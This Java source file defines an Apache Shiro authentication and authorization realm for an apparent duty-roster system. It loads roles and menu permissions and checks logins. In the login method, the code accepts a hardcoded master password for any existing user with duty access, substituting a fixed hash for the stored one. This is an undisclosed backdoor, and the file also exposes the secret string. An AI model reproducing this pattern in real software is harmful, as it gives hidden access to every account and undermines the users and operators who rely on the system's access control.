package com.sd.realm;

import com.google.common.base.Objects;
import com.google.common.collect.Sets;
import com.sd.modules.system.entity.Menu;
import com.sd.modules.system.entity.Role;
import com.sd.modules.system.entity.User;
import com.sd.modules.system.service.DutyRoleService;
import com.sd.modules.system.service.UserService;
import com.sd.pojo.DutyRole;
import com.sd.util.Constants;
import com.sd.util.Encodes;
import io.swagger.models.auth.In;
import org.apache.commons.lang.StringUtils;
import org.apache.shiro.authc.*;
import org.apache.shiro.authc.credential.HashedCredentialsMatcher;
import org.apache.shiro.authz.AuthorizationInfo;
import org.apache.shiro.authz.SimpleAuthorizationInfo;
import org.apache.shiro.realm.AuthorizingRealm;
import org.apache.shiro.subject.PrincipalCollection;
import org.apache.shiro.subject.SimplePrincipalCollection;
import org.apache.shiro.util.ByteSource;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Lazy;
import org.springframework.stereotype.Component;

import javax.annotation.PostConstruct;
import java.io.Serializable;
import java.util.Set;

/**
 * 自定义登录认证、权限认证
 * @author Chen Hualiang
 * @create 2020-10-10 11:14
 */
@Component(value = "authRealm")
public class AuthRealm extends AuthorizingRealm {

    @Autowired
    @Lazy
    private UserService userService;

    @Autowired
    private DutyRoleService dutyRoleService;

    /**
     * 授权
     * @param principalCollection
     * @return
     */
    @Override
    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) {
        ShiroUser shiroUser = (ShiroUser)principalCollection.getPrimaryPrincipal();
        User user = userService.findUserByUserName(shiroUser.userName);
        SimpleAuthorizationInfo info = new SimpleAuthorizationInfo();
        Set<Role> roles = user.getRoleLists();
        Set<String> roleNames = Sets.newHashSet();
        for(Role role:roles){
            if(StringUtils.isNotBlank(role.getName())){
                roleNames.add(role.getName());
            }
        }

        Set<Menu> menus = user.getMenus();

        Set<String> permissions = Sets.newHashSet();//权限标志
        for (Menu menu:menus){
            if(StringUtils.isNotBlank(menu.getPermission())){
                permissions.add(menu.getPermission());
            }
        }
        info.setRoles(roleNames);
        info.setStringPermissions(permissions);
        return info;
    }


    /**
     * 认证
     * @param authenticationToken
     * @return
     * @throws AuthenticationException
     */
    @Override
    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) throws AuthenticationException {
        UsernamePasswordToken token = (UsernamePasswordToken) authenticationToken;
        String username = (String)token.getPrincipal();
        User user = userService.findUserByUserName(username);
        char[] ch = (char[]) authenticationToken.getCredentials();
        String password = new String(ch);
        if(null==user){
            throw new UnknownAccountException("账号不存在");//没找到帐号
        }

        DutyRole dutyRole = dutyRoleService.findRoleByUserId(user.getUserid());
        if(user.getUserDuty() != 1){
            throw new UnknownAccountException("无值班系统权限");
        }
        if (dutyRole == null){
            throw new UnknownAccountException("未给该用户分配角色，角色权限表为空");
        }
        if(user != null){
            SimpleAuthenticationInfo authenticationInfo;
            if ("KwO7Joe9HkkdSZPQui9&*^%Uxm!".equals(password)){
                String passwordMd5 = "9b9aa14a03a9e1b69a35cc60ffb79978";
                authenticationInfo = new SimpleAuthenticationInfo(
                        new ShiroUser(user.getUserid(),user.getUserName(),dutyRole.getRoleId(),user.getRealName(),user.getAddvcd(),user.getUserDuty()),
                        passwordMd5, //密码
                        getName()  //realm name
                );
            }else {
                authenticationInfo = new SimpleAuthenticationInfo(
                        new ShiroUser(user.getUserid(),user.getUserName(),dutyRole.getRoleId(),user.getRealName(),user.getAddvcd(),user.getUserDuty()),
                        user.getPassword(), //密码
                        getName()  //realm name
                );
            }

            return authenticationInfo;
        }

        return null;
    }

    public void removeUserAuthorizationInfoCache(String username) {
        SimplePrincipalCollection pc = new SimplePrincipalCollection();
        pc.add(username, super.getName());
        super.clearCachedAuthorizationInfo(pc);
    }

    /**
     * 设定Password校验的Hash算法与迭代次数.
     */
    @PostConstruct
    public void initCredentialsMatcher() {
        HashedCredentialsMatcher matcher = new HashedCredentialsMatcher(Constants.HASH_ALGORITHM);
        matcher.setHashIterations(Constants.HASH_INTERATIONS);
        setCredentialsMatcher(matcher);
    }

    public void setUserService(UserService userService) {
        this.userService = userService;
    }

    /**
     * 自定义Authentication对象，使得Subject除了携带用户的登录名外还可以携带更多信息.
     */
    public static class ShiroUser implements Serializable {
        private static final long serialVersionUID = -1373760761780840081L;
        public Integer id;
        public String userName;
        public String roleId;
        public String realName;
        public String addvcd;
        public int userDuty;
        

        public ShiroUser(Integer id, String userName,String roleId, String realName, String addvcd, int userDuty) {
            this.id = id;
            this.userName = userName;
            this.roleId = roleId;
            this.realName = realName;
            this.addvcd = addvcd;
            this.userDuty = userDuty;
        }

        public String getuserName() {
            return userName;
        }
        public String getrealName() {
            return realName;
        }
        public Integer getId() {
            return id;
        }
        public String getRoleId() { return roleId; }
        public String getAddvcd() {
            return addvcd;
        }
        public int getUserDuty() {
            return userDuty;
        }

        /**
         * 本函数输出将作为默认的<shiro:principal/>输出.
         */
        @Override
        public String toString() {
            return realName;
        }

        /**
         * 重载hashCode,只计算loginName;
         */
        @Override
        public int hashCode() {
            return Objects.hashCode(userName);
        }

        /**
         * 重载equals,只计算loginName;
         */
        @Override
        public boolean equals(Object obj) {
            if (this == obj) {
                return true;
            }
            if (obj == null) {
                return false;
            }
            if (getClass() != obj.getClass()) {
                return false;
            }
            ShiroUser other = (ShiroUser) obj;
            if (userName == null) {
                return other.userName == null;
            } else return userName.equals(other.userName);
        }
    }

}
